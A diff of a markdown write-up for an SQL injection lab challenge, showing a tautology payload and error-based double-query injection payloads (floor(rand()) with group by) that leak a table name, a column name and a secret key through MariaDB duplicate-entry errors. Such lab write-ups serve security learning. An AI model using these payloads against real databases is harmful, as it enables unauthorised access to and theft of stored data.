@@ -1,20 +1,16 @@
-## Challenge - 5
+# Challenge - 5
 
 This challenge is based on double query injection and we have to use AND in this injection
 
 reference:
 
-http://www.securitytube.net/video/4283
+`http://www.securitytube.net/video/4283`
 
-http://www.securitytube.net/video/4303
-
-
-
-### Initial Analysis
+## Initial Analysis
 
 First we have to find out how the developer has given the query so we try giving id the value. We can break query using '`\`' Which will give an error
 
-```
+```ABAP
 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''\' LIMIT 0,1' at line 1
 ```
 
@@ -30,9 +26,9 @@ We can check this using id=
 0' or 1=1 --+
 ```
 
-which will give us a login id and password. 
+which will give us a login id and password.
 
-In here the query will not dump anything we give it. It will only dump the login_name and password in the table or the error statement. 
+In here the query will not dump anything we give it. It will only dump the login_name and password in the table or the error statement.
 
 Now we have to dump the secret key through the error
 
@@ -54,7 +50,7 @@ We can get the table name using: id=
 
 It will give the error:
 
-```
+```ABAP
 Duplicate entry ':8u4mpftsm8:0' for key 'group_key'
 ```
 
@@ -66,12 +62,9 @@ Now we can get the column name using: id=
 1' AND (select 1 from(select count(*),concat(0x3a,(select column_name from information_schema.columns where table_name='8u4mpftsm8' limit 2,1),0x3a,floor(rand()*2))a from information_schema.tables group by a)b); --+
 ```
 
-
 Which will give the error:
 
-Which will give the error:
-
-```
+```ABAP
 Duplicate entry ':secret_5SO5:0' for key 'group_key'
 ```
 
@@ -85,10 +78,9 @@ Now we can get the secret key using : id=
 
 Which will give the error:
 
-```
+```ABAP
 Duplicate entry ':Seu3ERzUbdGJm8cmLpUXpxkE:0' for key 'group_key'
 ```
 
 where the key is :
-
 **Seu3ERzUbdGJm8cmLpUXpxkE**
